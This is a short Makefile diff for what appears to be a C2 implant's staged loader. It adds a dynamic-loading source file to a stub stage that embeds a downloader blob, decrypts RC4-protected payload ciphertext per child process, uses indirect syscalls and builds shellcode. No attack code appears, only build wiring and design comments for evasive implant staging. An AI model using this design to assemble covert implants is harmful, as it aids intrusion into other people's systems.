@@ -208,9 +208,12 @@ DL_BLOB_H = downloader_blob.h
 # Stub stage: the tiny resident entry point that embeds the downloader blob and
 # owns the agent lifecycle (including the supervisor). It owns decryption so
 # that the parent can keep the payload ciphertext while each supervised child
-# decrypts its own RX view.
+# decrypts its own RX view. It resets the shared dynload context with
+# dynload_reset(), so it links dynload.c; --gc-sections drops the unresolved
+# ELF/maps parser the downloader blob carries on its own.
 STUB_SRCS = stub.c syscalls_indirect.c stager_state.c $(C2_SRC)/strings.c \
-            $(C2_SRC)/system.c $(C2_SRC)/rc4.c $(C2_SRC)/debug.c
+            $(C2_SRC)/system.c $(C2_SRC)/rc4.c $(C2_SRC)/debug.c \
+            $(C2_SRC)/dynload.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
